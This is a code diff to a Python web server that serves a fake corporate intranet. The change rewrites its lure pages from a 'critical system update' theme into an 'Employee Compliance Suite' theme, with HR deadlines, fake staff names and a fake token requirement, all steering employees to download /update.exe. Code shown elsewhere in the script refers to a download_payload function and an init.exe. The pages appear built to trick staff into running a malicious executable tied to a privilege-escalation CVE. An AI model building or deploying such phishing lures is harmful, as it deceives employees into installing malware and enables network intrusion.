@@ -36,26 +36,28 @@ def download_payload():
     except:
         return None
 
-# HTTP server to serve init.exe and update portal
+# HTTP server to serve init.exe and multi-page intranet portal
 class HTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Common nav bar for all pages
         nav_bar = """
         <nav class="bg-blue-600 text-white py-4">
             <div class="container mx-auto px-4 flex justify-between items-center">
-                <h1 class="text-xl font-bold">Corporate IT Services</h1>
+                <h1 class="text-xl font-bold">Corporate Intranet</h1>
                 <div class="space-x-4">
                     <a href="/" class="hover:text-gray-200 {}">Home</a>
-                    <a href="/security" class="hover:text-gray-200 {}">Security Risks</a>
-                    <a href="/update" class="hover:text-gray-200 {}">Update</a>
+                    <a href="/alerts" class="hover:text-gray-200 {}">Security Alerts</a>
+                    <a href="/training" class="hover:text-gray-200 {}">Training</a>
+                    <a href="/support" class="hover:text-gray-200 {}">Support</a>
                     <a href="/about" class="hover:text-gray-200 {}">About</a>
                 </div>
             </div>
         </nav>
         """.format(
             "font-semibold" if self.path == "/" else "",
-            "font-semibold" if self.path == "/security" else "",
-            "font-semibold" if self.path == "/update" else "",
+            "font-semibold" if self.path == "/alerts" else "",
+            "font-semibold" if self.path == "/training" else "",
+            "font-semibold" if self.path == "/support" else "",
             "font-semibold" if self.path == "/about" else ""
         )
 
@@ -74,7 +76,7 @@ class HTTPHandler(BaseHTTPRequestHandler):
             html = f"""
             <html>
                 <head>
-                    <title>Corporate IT Services</title>
+                    <title>Corporate Intranet - Employee Compliance Suite</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
@@ -83,28 +85,31 @@ class HTTPHandler(BaseHTTPRequestHandler):
                     <!-- Hero Section -->
                     <section class="py-12 text-center">
                         <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Critical System Update Required</h2>
-                            <p class="text-lg text-gray-600 mb-6">A critical security update is required by July 10, 2025, to maintain network access and protect against vulnerabilities.</p>
-                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Install Update Now</a>
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">2025 Employee Compliance Suite</h2>
+                            <p class="text-lg text-gray-600 mb-6">Install the mandatory Employee Compliance Suite by July 15, 2025, to generate your Network Access Token and comply with HR cybersecurity policies.</p>
+                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
+                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 90%"></div>
+                            </div>
+                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Compliance Suite</a>
                         </div>
                     </section>
                     <footer class="bg-gray-800 text-white py-4">
                         <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                         </div>
                     </footer>
                 </body>
             </html>
             """
             self.wfile.write(html.encode('utf-8'))
-        elif self.path == '/security':
+        elif self.path == '/alerts':
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             html = f"""
             <html>
                 <head>
-                    <title>Security Risks - Corporate IT Services</title>
+                    <title>Security Alerts - Corporate Intranet</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
@@ -112,48 +117,74 @@ class HTTPHandler(BaseHTTPRequestHandler):
                     {nav_bar}
                     <section class="py-12">
                         <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Security Risks</h2>
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Security Alerts</h2>
                             <h3 class="text-xl font-semibold text-gray-700 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
-                            <p class="text-lg text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file, to exploit. Microsoft released a patch in May 2024.</p>
-                            <p class="text-lg text-gray-600 mb-4">Unpatched systems are at risk of malware, data theft, and unauthorized access. Install the latest update to mitigate this threat.</p>
-                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update</a>
+                            <p class="text-lg text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file. Microsoft released a patch in May 2024.</p>
+                            <p class="text-lg text-gray-600 mb-4">Unpatched systems are vulnerable to malware infections, data breaches, and unauthorized access. Ensure your system is compliant with the latest HR cybersecurity policies.</p>
                         </div>
                     </section>
                     <footer class="bg-gray-800 text-white py-4">
                         <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                         </div>
                     </footer>
                 </body>
             </html>
             """
             self.wfile.write(html.encode('utf-8'))
-        elif self.path == '/update':
+        elif self.path == '/training':
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             html = f"""
             <html>
                 <head>
-                    <title>System Update - Corporate IT Services</title>
+                    <title>Training Resources - Corporate Intranet</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
                 <body class="bg-gray-100 font-sans">
                     {nav_bar}
-                    <section class="py-12 text-center">
+                    <section class="py-12">
                         <div class="container mx-auto px-4">
-                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Install System Update</h2>
-                            <p class="text-lg text-gray-600 mb-6">Download and install the latest update by July 10, 2025, to protect against critical vulnerabilities like CVE-2024-30051.</p>
-                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
-                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 75%"></div>
-                            </div>
-                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update Now</a>
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Cybersecurity Training Resources</h2>
+                            <p class="text-lg text-gray-600 mb-4">Our 2025 Phishing Awareness and GDPR Compliance training modules are mandatory for all employees. Complete by July 15, 2025, to meet HR requirements.</p>
+                            <p class="text-lg text-gray-600 mb-4">The Employee Compliance Suite includes access to these modules and generates your Network Access Token.</p>
+                            <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Access Training Modules</a>
                         </div>
                     </section>
                     <footer class="bg-gray-800 text-white py-4">
                         <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
+                        </div>
+                    </footer>
+                </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/support':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = f"""
+            <html>
+                <head>
+                    <title>IT Support - Corporate Intranet</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                </head>
+                <body class="bg-gray-100 font-sans">
+                    {nav_bar}
+                    <section class="py-12">
+                        <div class="container mx-auto px-4">
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">IT Support</h2>
+                            <p class="text-lg text-gray-600 mb-4">Contact our IT team at support@corporateintranet.com or call (555) 012-3456 for assistance with 2025 compliance policies.</p>
+                            <p class="text-lg text-gray-600 mb-4">Our team ensures all systems meet HR cybersecurity requirements, including the mandatory Employee Compliance Suite installation.</p>
+                        </div>
+                    </section>
+                    <footer class="bg-gray-800 text-white py-4">
+                        <div class="container mx-auto px-4 text-center">
+                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                         </div>
                     </footer>
                 </body>
@@ -167,7 +198,7 @@ class HTTPHandler(BaseHTTPRequestHandler):
             html = f"""
             <html>
                 <head>
-                    <title>About Us - Corporate IT Services</title>
+                    <title>About Us - Corporate Intranet</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
@@ -176,14 +207,13 @@ class HTTPHandler(BaseHTTPRequestHandler):
                     <section class="py-12">
                         <div class="container mx-auto px-4">
                             <h2 class="text-3xl font-semibold text-gray-800 mb-4">About Our IT Team</h2>
-                            <p class="text-lg text-gray-600 mb-4">Our dedicated IT team ensures your systems are secure and up-to-date. With over 20 years of experience, we provide cutting-edge solutions to protect your network.</p>
-                            <p class="text-lg text-gray-600 mb-4">Contact us at support@corporateit.com for assistance with the latest system update.</p>
-                            <a href="/update" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Get the Update</a>
+                            <p class="text-lg text-gray-600 mb-4">Led by John Smith (Cybersecurity Lead) and Jane Doe (Compliance Officer), our IT team has over 20 years of experience ensuring network security.</p>
+                            <p class="text-lg text-gray-600 mb-4">We collaborate with HR to enforce 2025 cybersecurity policies, protecting our corporate network from emerging threats.</p>
                         </div>
                     </section>
                     <footer class="bg-gray-800 text-white py-4">
                         <div class="container mx-auto px-4 text-center">
-                            <p>© 2025 Corporate IT Services. All rights reserved.</p>
+                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                         </div>
                     </footer>
                 </body>
